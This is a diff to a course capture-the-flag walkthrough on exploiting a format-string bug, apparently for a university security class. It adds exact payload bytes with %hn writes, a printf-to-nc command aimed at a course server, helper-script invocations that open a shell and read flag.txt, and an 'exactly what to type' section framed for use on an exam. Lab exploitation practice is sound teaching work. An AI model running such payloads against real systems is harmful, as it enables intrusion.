@@ -8,23 +8,31 @@ This was retrieved from the remote service before this walkthrough was finalized
 
 ## Fast Start
 
-If you just want the easiest command that still shows all hand-calculation values:
+If you just want the easiest command for the exam:
 
 ```bash
 cd /home/jbenjam7/cs466/ctf/formatstring4
-/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py
 ```
 
 Helper script path: `ctf/formatstring4/exploit_easy.py`
 
-It prints:
+It now does the full exam workflow for you:
 - leaked addresses
 - return address math
 - high/low halfwords
 - paddings
 - payload length
+- tries common return-address offsets if needed
 
 Then it sends the payload in the same connection.
+
+If you want to force one mode:
+
+```bash
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode local
+```
 
 ---
 
@@ -86,6 +94,29 @@ Payload must be exactly 31 bytes:
 
 Total: `8 + 23 = 31`
 
+### 6.5 Exact terminal input for this hand example
+
+Using the exact worked values above:
+- `addr1 = 0xffffdc6e` -> `\x6e\xdc\xff\xff`
+- `addr2 = 0xffffdc6c` -> `\x6c\xdc\xff\xff`
+- format = `%2044c%1$hn%35234c%2$hn`
+
+The raw payload bytes are:
+
+```text
+\x6e\xdc\xff\xff\x6c\xdc\xff\xff%2044c%1$hn%35234c%2$hn
+```
+
+If you want the exact terminal command form (for these exact numbers):
+
+```bash
+printf '\x6e\xdc\xff\xff\x6c\xdc\xff\xff%%2044c%%1$hn%%35234c%%2$hn' | nc moa6.eecs.utk.edu 32150
+```
+
+Important:
+- This is the command for the example values in this walkthrough.
+- On the exam, if leaked addresses are different, recompute `addr1/addr2/pad1/pad2` first, then rebuild this command with the new bytes and paddings.
+
 ### 7. Why pure shell is painful here
 
 This challenge has ASLR and requires leak + payload in one live session.
@@ -115,21 +146,23 @@ Local:
 
 ```bash
 cd /home/jbenjam7/cs466/ctf/formatstring4
-/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py local
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode local
 ```
 
 Remote:
 
 ```bash
 cd /home/jbenjam7/cs466/ctf/formatstring4
-/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote
 ```
 
 Optional custom command:
 
 ```bash
-/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py remote --cmd "id\nexit\n"
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote --cmd "id\nexit\n"
 ```
+
+If the binary changes a little but still leaks `jump` and `buffer` in the same banner, this script still works as long as the leak line keeps the same idea: one code address and one stack address. It waits for the full prompt line before parsing, so it is less likely to grab a partial leak.
 
 ---
 
@@ -141,3 +174,44 @@ If it fails, verify these first:
 3. `pad1` and `pad2` are computed from character counts.
 4. Payload length is exactly 31.
 5. Addresses are little-endian in the payload.
+
+---
+
+## Exactly What To Type In Terminal
+
+If this challenge appears on the exam, type these commands exactly.
+
+### Primary (remote target)
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring4
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote
+```
+
+### Fast default (auto mode)
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring4
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py
+```
+
+### Local practice
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring4
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode local
+```
+
+### If offset changes, force offset scan target
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring4
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote --ret-offset 48
+```
+
+### If you want a custom command after shell pops
+
+```bash
+cd /home/jbenjam7/cs466/ctf/formatstring4
+/home/jbenjam7/cs466/.venv/bin/python exploit_easy.py --mode remote --cmd "id\ncat flag.txt\nexit\n"
+```
